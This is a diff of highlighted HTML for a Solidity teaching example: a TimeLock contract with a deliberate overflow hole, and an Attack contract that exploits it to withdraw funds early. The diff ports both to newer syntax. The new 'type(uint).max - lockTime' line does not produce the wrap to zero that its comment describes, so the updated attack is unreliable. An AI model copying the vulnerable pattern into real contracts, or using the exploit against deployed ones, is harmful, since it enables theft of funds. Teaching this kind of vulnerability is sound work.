@@ -29,7 +29,7 @@ before the 1 week waiting period.
 
     <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">deposit</span>(<span class=\\"hljs-params\\"></span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">external</span></span> <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">payable</span></span> </span>{
         balances[<span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>] += <span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">value</span>;
-        lockTime[<span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>] = <span class=\\"hljs-built_in\\">now</span> + <span class=\\"hljs-number\\">1</span> <span class=\\"hljs-literal\\">weeks</span>;
+        lockTime[<span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>] = <span class=\\"hljs-built_in\\">block</span>.<span class=\\"hljs-built_in\\">timestamp</span> + <span class=\\"hljs-number\\">1</span> <span class=\\"hljs-literal\\">weeks</span>;
     }
 
     <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">increaseLockTime</span>(<span class=\\"hljs-params\\"><span class=\\"hljs-keyword\\">uint</span> _secondsToIncrease</span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">public</span></span> </span>{
@@ -38,7 +38,7 @@ before the 1 week waiting period.
 
     <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">function</span> <span class=\\"hljs-title\\">withdraw</span>(<span class=\\"hljs-params\\"></span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">public</span></span> </span>{
         <span class=\\"hljs-built_in\\">require</span>(balances[<span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>] &gt; <span class=\\"hljs-number\\">0</span>, <span class=\\"hljs-string\\">\\"Insufficient funds\\"</span>);
-        <span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-built_in\\">now</span> &gt; lockTime[<span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>], <span class=\\"hljs-string\\">\\"Lock time not expired\\"</span>);
+        <span class=\\"hljs-built_in\\">require</span>(<span class=\\"hljs-built_in\\">block</span>.<span class=\\"hljs-built_in\\">timestamp</span> &gt; lockTime[<span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>], <span class=\\"hljs-string\\">\\"Lock time not expired\\"</span>);
 
         <span class=\\"hljs-keyword\\">uint</span> amount = balances[<span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>];
         balances[<span class=\\"hljs-built_in\\">msg</span>.<span class=\\"hljs-built_in\\">sender</span>] = <span class=\\"hljs-number\\">0</span>;
@@ -51,7 +51,7 @@ before the 1 week waiting period.
 <span class=\\"hljs-class\\"><span class=\\"hljs-keyword\\">contract</span> <span class=\\"hljs-title\\">Attack</span> </span>{
     TimeLock timeLock;
 
-    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\">TimeLock _timeLock</span>) <span class=\\"hljs-title\\"><span class=\\"hljs-keyword\\">public</span></span> </span>{
+    <span class=\\"hljs-function\\"><span class=\\"hljs-keyword\\">constructor</span>(<span class=\\"hljs-params\\">TimeLock _timeLock</span>) </span>{
         timeLock = TimeLock(_timeLock);
     }
 
@@ -65,7 +65,7 @@ before the 1 week waiting period.
         so x = -t
         */</span>
         timeLock.increaseLockTime(
-            <span class=\\"hljs-keyword\\">uint</span>(-timeLock.lockTime(<span class=\\"hljs-keyword\\">address</span>(<span class=\\"hljs-built_in\\">this</span>)))
+            <span class=\\"hljs-built_in\\">type</span>(<span class=\\"hljs-keyword\\">uint</span>).<span class=\\"hljs-built_in\\">max</span> - timeLock.lockTime(<span class=\\"hljs-keyword\\">address</span>(<span class=\\"hljs-built_in\\">this</span>))
         );
         timeLock.withdraw();
     }
